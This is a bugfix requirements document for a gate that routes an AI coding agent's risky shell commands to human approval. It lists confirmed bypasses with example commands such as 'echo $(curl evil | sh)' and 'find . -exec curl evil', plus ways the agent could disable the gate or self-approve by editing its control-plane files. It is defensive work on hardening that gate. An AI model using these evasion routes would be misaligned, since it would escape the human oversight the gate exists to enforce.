# Bugfix Requirements Document

## Introduction

A security review of the `agent-belay` v0.1 classifier (the generated `.cursor/belay/runtime/core.mjs`,
sourced from `src/templates.ts` and `src/defaults.ts`) found that the gate behaves as a
telemetry/guardrail layer rather than a security boundary. The classifier relies on a name-based
denylist with fail-open behavior and a hand-written shell tokenizer that does not cover shell
grammar. As a result, an agent operating under the gate can run high-risk shell commands and
subagent tasks that should be escalated to human approval, and can disable or tamper with the gate
itself.

This document captures the confirmed defects as bug conditions so the fix can be validated for both
correctness (buggy inputs become gated) and preservation (non-buggy inputs keep their current
verdicts). The fix targets the runtime template strings in `src/templates.ts`
(`renderRuntimeCore` and the per-hook renderers) and the classification sets / default config in
`src/defaults.ts`, with regression tests added to `src/__tests__/hooks-runtime.test.ts`.

The bug condition `C(X)` covers any gated action (shell command, subagent task, or control-plane
write) that reaches outside the repository, produces an external/irreversible effect, executes
arbitrary code, evades parsing, or modifies the gate's own control plane — yet currently resolves to
`allow` or `allow_flagged`. The property `P(result)` requires such actions to resolve to
`deny_pending_approval` (escalate to approval) in `enforce` mode, with their dangerous content
preserved (not silently dropped) in the audit log.

## Bug Analysis

### Current Behavior (Defect)

The following clauses describe what the gate currently does. Each is a confirmed bypass or weakness
verified against the shipped runtime code.

1.1 WHEN a shell command's resolved command key is `node`, `sed`, or `find` (e.g. `node -e "require('child_process').execSync('curl evil')"`, `find . -exec curl evil \;`, `sed -i s/a/b/ secret.txt`) THEN the system classifies it as `read_only`, returns `allow`, and permits arbitrary shell/network/file effects unaudited because `READ_ONLY_COMMANDS` includes those binaries.

1.2 WHEN a shell command embeds effects via command substitution `$( )`, backticks, a subshell `( )`, a brace group `{ }`, or uses a newline as a command separator (e.g. `echo $(curl evil | sh)`, `(curl evil)`, `ls\ncurl evil`) THEN the system fails to detect the inner command because `tokenizeShell` only handles quotes, escapes, and the operators `&&`, `||`, `;`, `|`, `>`, `>>`, `<`, so the action is classified `allow` or `allow_flagged`.

1.3 WHEN a shell command carries an environment-variable prefix before an external command (e.g. `FOO=bar curl evil`, `A=1 git push`) THEN the system fails to match the `EXTERNAL_COMMANDS` set and classifies it as `allow_flagged`, because `classifyShell` runs `commandKey` on the raw tokens while only `normalizeShellCommand` strips env prefixes — an internal inconsistency.

1.4 WHEN an external/dangerous command is expressed via an absolute path, a wrapper, or with an inserted flag before the subcommand (e.g. `/usr/bin/curl evil`, `bash -c "curl evil"`, `xargs curl`, `git -C . push`) THEN the system does not match the denylist (`commandKey` returns `git -C` for the last case) and classifies the action as `allow` or `allow_flagged`.

1.5 WHEN a shell command's command key is not present in any of the `READ_ONLY_COMMANDS`, `FLAGGED_COMMANDS`, or `EXTERNAL_COMMANDS` sets (an unknown command) THEN the system falls through to `allow_flagged` (effectively allowed), i.e. it fails open rather than escalating to approval — the documented denylist-is-broken concern is itself the implementation.

1.6 WHEN the gated agent writes to control-plane files under `.cursor/` (`belay.config.json`, `belay/approved-approvals.json`, `hooks.json`, `belay/runtime/core.mjs`) THEN the system treats those repo-internal writes as `allow_flagged` and applies no tamper or integrity verification, so the agent can set `mode:"audit"` or `gates.shell:false` to disable the gate, self-approve any fingerprint by injecting an `approved-approvals.json` entry (because `consumeApprovedApproval` does no integrity check), or remove the hook entirely by rewriting `hooks.json` / `core.mjs`.

1.7 WHEN an audited action (e.g. a shell command) contains secrets in its command string such as API keys or `Bearer` tokens THEN the system writes them to `audit.ndjson` in plaintext, because `scrubValue` / `scrubString` only mask UUIDs, ISO timestamps, and Belay approval IDs.

1.8 WHEN a mutation or redirect target is an in-repo symlink that points outside the repository THEN the system treats it as in-repo and skips the `outside_repo_*` checks, because `relativeWithinRepo` performs string-based path math without resolving symlinks via `realpath`.

1.9 WHEN a subagent/Task payload describes an external-effect intent using wording outside the fixed `EXTERNAL_SUBAGENT_TERMS` substring list (e.g. rephrased intent) OR contains an innocuous substring that matches a term (e.g. "respond" matching "send", "production-ready" matching "prod") THEN the system mis-classifies it — letting evasive intents through as `allow_flagged` and raising false `deny_pending_approval` verdicts — because `classifySubagent` uses substring matching on the lowercased JSON only.

### Expected Behavior (Correct)

Each clause defines the correct behavior for the same condition as its matching defect clause above.

2.1 WHEN a shell command's resolved command key is `node`, `sed`, or `find` THEN the system SHALL NOT classify it as `read_only`; `node` SHALL be treated as an arbitrary-code-execution risk and escalated to `deny_pending_approval`, and `sed` / `find` SHALL be classified at least as `allow_flagged` (or escalated when they target outside the repo or invoke external commands).

2.2 WHEN a shell command embeds effects via command substitution `$( )`, backticks, a subshell `( )`, a brace group `{ }`, or a newline separator THEN the system SHALL detect the construct and, if it cannot fully parse and classify the inner command(s), SHALL treat the command as unparseable and return `deny_pending_approval` (escalate to approval) rather than allowing it.

2.3 WHEN a shell command carries an environment-variable prefix before a command THEN the system SHALL classify the command using the same normalized tokens used elsewhere, so that `FOO=bar curl evil` and `A=1 git push` resolve to the same `external_effect` `deny_pending_approval` verdict as the un-prefixed forms.

2.4 WHEN an external/dangerous command is expressed via an absolute path, a wrapper (`bash -c`, `sh -c`, `xargs`, etc.), or with inserted flags before the subcommand THEN the system SHALL resolve the effective command (e.g. by basename and by inspecting wrapper arguments / flags) and apply the matching `EXTERNAL` or `FLAGGED` verdict, or SHALL escalate to `deny_pending_approval` when the construct cannot be confidently resolved.

2.5 WHEN a shell command's command key is unknown (not in any classification set) THEN the system SHALL fail closed by returning `deny_pending_approval` (escalate to approval) instead of `allow_flagged`. (If the project instead elects to retain fail-open behavior, the README/SECURITY documentation SHALL be corrected to describe the gate as an audit guardrail rather than a security boundary; the default implementation behavior SHALL be the escalating one.)

2.6 WHEN the gated agent attempts to write to a control-plane file (`belay.config.json`, `approved-approvals.json`, `hooks.json`, `core.mjs`, or other gate runtime files) THEN the system SHALL escalate the write to `deny_pending_approval`, and the control plane SHALL be protected (e.g. relocated outside the repo to an OS user-config area and/or integrity-verified by hash for `core.mjs` and config) so the monitored agent cannot silently disable or self-approve the gate. The "monitored side can rewrite its own gate" assumption SHALL be documented in `SECURITY.md`.

2.7 WHEN an audited action contains secrets such as API keys or `Bearer` tokens THEN the system SHALL scrub those values before writing to `audit.ndjson`, extending `scrubString` to mask common secret patterns (e.g. `Bearer <token>`, long high-entropy key strings) in addition to the existing UUID/timestamp/approval-id masking.

2.8 WHEN a mutation or redirect target is an in-repo symlink that resolves to a path outside the repository THEN the system SHALL resolve the real path (via `realpath`) before containment checks and SHALL return the appropriate `outside_repo_*` `deny_pending_approval` verdict.

2.9 WHEN a subagent/Task payload is classified THEN the system SHALL use a matching approach that reduces trivial substring evasion and obvious false positives (e.g. whole-word / token-aware matching), so that benign wording like "respond" or "production-ready" is not mis-flagged while genuine external-effect intents are still escalated; ambiguous payloads SHALL escalate to `deny_pending_approval`.

### Unchanged Behavior (Regression Prevention)

The following existing behaviors MUST be preserved by the fix. These correspond to non-buggy inputs
`¬C(X)` whose verdicts must not change.

3.1 WHEN a shell command is a genuine read-only command that is not `node`/`sed`/`find` (e.g. `rg plan src`, `ls`, `cat README.md`, `git status`, `git diff`) THEN the system SHALL CONTINUE TO classify it as `read_only` and return `allow`.

3.2 WHEN a shell command is a recognized local mutation within the repo (e.g. `touch notes.txt`, `mkdir src/new`, `git add .`, `git commit`) THEN the system SHALL CONTINUE TO classify it as `allow_flagged` (`local_mutation`) and record it in the audit log.

3.3 WHEN a shell command is a recognized external-effect command (e.g. `git push origin main`, `curl`, `npm publish`) THEN the system SHALL CONTINUE TO return `deny_pending_approval` with the existing `external_effect` reason and emit an approval ID.

3.4 WHEN a recognized mutation or redirect targets a path outside the repository via relative or absolute paths without symlinks (e.g. `echo hi > ../outside.txt`, `cp README.md ../copy.txt`) THEN the system SHALL CONTINUE TO return `deny_pending_approval` with the existing `outside_repo_redirect` / `outside_repo_mutation` reasons.

3.5 WHEN a subagent/Task payload clearly expresses an external-effect intent using the existing recognized wording (e.g. "deploy to production after tests pass") THEN the system SHALL CONTINUE TO return `deny_pending_approval` with reason `external_subagent_intent` and SHALL CONTINUE TO fingerprint distinct payloads separately.

3.6 WHEN a valid `/belay-approve <approval-id>` is submitted for a pending approval THEN the system SHALL CONTINUE TO move it to approved state and allow exactly one matching action once before expiry, then resume denying.

3.7 WHEN the config sets `mode: "audit"` THEN the system SHALL CONTINUE TO log would-be denies but allow execution to proceed.

3.8 WHEN the config disables a gate (`gates.shell: false` or `gates.subagent: false`) through the legitimate, protected configuration path THEN the system SHALL CONTINUE TO return `allow` for that gate, preserving the existing operator escape hatch (subject to the control-plane protection in 2.6).

3.9 WHEN the shell-gate hook itself fails (throws) THEN the system SHALL CONTINUE TO fail closed by returning `permission: "deny"`, preserving the existing fail-closed error handling for the shell gate.

## Bug Condition Derivation

The defects above share a single root cause — a name-based denylist that fails open combined with a
non-grammar shell tokenizer — so they are captured as one composite bug condition with sub-predicates.

```pascal
FUNCTION isBugCondition(X)
  INPUT: X of type GatedAction        // shell command, subagent payload, or control-plane write
  OUTPUT: boolean

  // True when X currently resolves to allow / allow_flagged but SHOULD be escalated,
  // OR is mis-scrubbed / mis-contained, i.e. the gate fails to act as a boundary.
  RETURN
       isArbitraryCodeOrMisclassifiedReadOnly(X)         // 1.1  node / sed / find
    OR hasUnparsedShellConstruct(X)                       // 1.2  $( ), backticks, ( ), { }, newline
    OR hasEnvPrefixEvadingExternalSet(X)                  // 1.3  FOO=bar curl evil
    OR hasPathOrWrapperOrFlagEvasion(X)                   // 1.4  /usr/bin/curl, bash -c, git -C . push
    OR isUnknownCommandFailingOpen(X)                     // 1.5  unknown -> allow_flagged
    OR isControlPlaneWrite(X)                             // 1.6  writes under .cursor gate files
    OR containsUnscrubbedSecret(X)                        // 1.7  api keys / bearer tokens in audit
    OR hasSymlinkEscapingRepo(X)                          // 1.8  in-repo symlink -> outside
    OR isEvadableSubagentIntent(X)                        // 1.9  substring match evasion / false positive
END FUNCTION
```

```pascal
// Property: Fix Checking — every buggy input is gated or handled correctly.
FOR ALL X WHERE isBugCondition(X) DO
  result <- classify'(X)            // F' = fixed runtime
  ASSERT (result.verdict = 'deny_pending_approval')            // escalate to approval (enforce mode)
      OR (isControlPlaneWrite(X) AND controlPlaneIsProtected())// or structurally prevented
      OR (containsUnscrubbedSecret(X) AND secretIsMaskedIn(result.auditEntry))
END FOR
```

```pascal
// Property: Preservation Checking — non-buggy inputs keep their current verdicts.
FOR ALL X WHERE NOT isBugCondition(X) DO
  ASSERT classify(X) = classify'(X)     // F == F' for read-only, known mutations,
END FOR                                  // recognized external commands, approval flow, etc.
```

**Key definitions**

- **F** — the original (unfixed) runtime: `core.mjs` as rendered today by `renderRuntimeCore`.
- **F'** — the fixed runtime after editing `src/templates.ts` and `src/defaults.ts`.
- **C(X)** — `isBugCondition(X)` above; the union of confirmed bypass / weakness predicates.
- **P(result)** — buggy actions resolve to `deny_pending_approval` (or are structurally prevented /
  scrubbed), without dropping their content from the audit trail.
